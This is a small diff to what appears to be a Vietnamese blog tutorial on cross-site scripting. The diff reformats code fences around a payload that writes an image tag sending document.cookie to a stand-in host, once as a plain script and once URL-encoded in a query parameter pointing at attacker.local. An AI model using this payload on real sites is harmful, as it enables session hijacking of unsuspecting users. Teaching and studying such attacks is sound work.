@@ -227,7 +227,8 @@ Kết quả sẽ trả lại là
 
 Payload: 
 
-```<script>document.write('<img src="http://site1.local/index.php?c='%2bdocument.cookie%2b'" />');</script>
+```
+<script>document.write('<img src="http://site1.local/index.php?c='%2bdocument.cookie%2b'" />');</script>
 ```
 
 URL:
@@ -235,6 +236,7 @@ URL:
 ```
 http://site1.local/tut4/index.php?name=%3Cscript%3Edocument.write(%27%3Cimg%20src=%22http://attacker.local/index.php?c=%27%2bdocument.cookie%2b%27%22%20/%3E%27);%3C/script%3E
 ```
+
 Kết quả trả lại sẽ là redirect sang trang 
 
 ![URL get2]( {{site.url}}/assets/img/2021/05/17/210517_url_get2.JPG){:width="500px"}
